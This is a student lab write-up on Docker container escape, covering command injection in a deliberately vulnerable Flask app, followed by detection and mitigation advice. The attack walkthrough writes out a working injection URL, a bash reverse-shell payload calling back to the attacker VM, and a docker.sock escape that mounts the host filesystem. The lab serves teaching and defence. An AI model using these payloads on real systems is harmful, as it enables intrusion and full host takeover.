# Docker Escape - Attack & Detection

**Semester 4 College Project | OS & Cybersecurity**

A demonstration of how a common Docker misconfiguration (mounting `/var/run/docker.sock` into a container) combined with a command injection vulnerability in a web app leads to full host compromise. The project covers the attack, detection, and mitigation.

---

## What This Is

A controlled lab environment running two Kali Linux VMs on a VirtualBox NAT Network. One VM runs a deliberately vulnerable Flask app called **NetDiag** inside Docker. The other acts as the attacker.

The attack chain:

```
Command Injection -> Reverse Shell -> docker.sock Abuse -> Host Compromise
```

No kernel exploits. No CVEs. Just two misconfigurations that are common in real deployments.

---

## Files

```
app.py        Flask app with the intentional command injection vulnerability
Dockerfile    Builds the NetDiag image, runs as root (intentional for demo)
```

---

## Setup

**Both VMs on VirtualBox NAT Network:**

| VM | Role | IP |
|----|------|----|
| VM 1 | Victim (runs Docker) | 192.168.98.4 |
| VM 2 | Attacker | 192.168.98.5 |

**On VM 1 - build and run the container with the misconfiguration:**

```bash
docker build -t netdiag .

docker run -d \
  -p 5000:5000 \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --name netdiag-app \
  netdiag
```

The `-v /var/run/docker.sock` flag is the intentional misconfiguration.

---

## The Vulnerability

In `app.py`, the `/ping` route passes user input directly into a shell command:

```python
result = os.popen("ping -c 3 " + host).read()
```

No sanitization. Anything after a `;` runs as a separate shell command on the server.

---

## Attack Walkthrough

### 1. Confirm RCE

From VM 2, visit:

```
http://192.168.98.4:5000/ping?host=8.8.8.8;id
```

Response includes `uid=0(root)` - you have remote code execution as root inside the container.

### 2. Get a Reverse Shell

Start a listener on VM 2:

```bash
nc -lvnp 4444
```

Trigger the shell:

```bash
curl "http://192.168.98.4:5000/ping?host=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.98.5/4444+0>%261'"
```

The browser hangs. VM 2 receives the connection and you are now inside the container as root.

### 3. Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

### 4. Find the Socket

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root 132 ... /var/run/docker.sock
```

The socket is bind-mounted. You now have direct access to the host Docker daemon.

### 5. Install Docker CLI and Escape

```bash
apt-get update && apt-get install -y docker.io

docker -H unix:///var/run/docker.sock run -d \
  -v /:/hostfs --rm alpine \
  chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'
```

### 6. Verify Host Compromise

On VM 1, outside any container:

```bash
cat /tmp/escaped.txt
# pwned
```

Written from inside a container, readable on the real host. Full compromise.

---

## Detection

```bash
# Check what is mounted in the container
docker inspect netdiag-app | grep -A 5 "Mounts"

# Monitor docker.sock access with auditd
auditctl -w /var/run/docker.sock -p rwxa -k docker_sock
ausearch -k docker_sock
```

Falco also has built-in rules that fire the moment docker.sock is accessed from inside a container - "Sensitive mount in container" and "Container with docker.sock mount".

---

## Mitigation

**Never do this in production:**

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock ...
```

**Fixes:**

- Use **rootless Docker** - daemon does not run as root
- Use **Podman** - no daemon, no socket attack surface
- If docker.sock access is genuinely needed, use **Docker Socket Proxy** (Tecnativa) to restrict which API calls are allowed
- Fix the code - replace `os.popen()` with `subprocess.run(['ping', '-c', '3', host])` so user input never touches the shell

---

## Quick Reference

| Step | Machine | Command |
|------|---------|---------|
| Build image | VM 1 | `docker build -t netdiag .` |
| Run with sock | VM 1 | `docker run -d -p 5000:5000 -v /var/run/docker.sock:/var/run/docker.sock --name netdiag-app netdiag` |
| Start listener | VM 2 | `nc -lvnp 4444` |
| Trigger RCE | VM 2 | visit `?host=8.8.8.8;id` |
| Reverse shell | VM 2 | curl with bash payload |
| Find sock | VM 2 (container) | `ls -la /var/run/docker.sock` |
| Install CLI | VM 2 (container) | `apt-get update && apt-get install -y docker.io` |
| Escape | VM 2 (container) | `docker -H unix:///var/run/docker.sock run -d -v /:/hostfs --rm alpine chroot /hostfs sh -c '...'` |
| Prove access | VM 1 (host) | `cat /tmp/escaped.txt` |

---

*Zala Vishmayraj Jagjitsingh | 241370107071 | GTU-SET | Semester 4*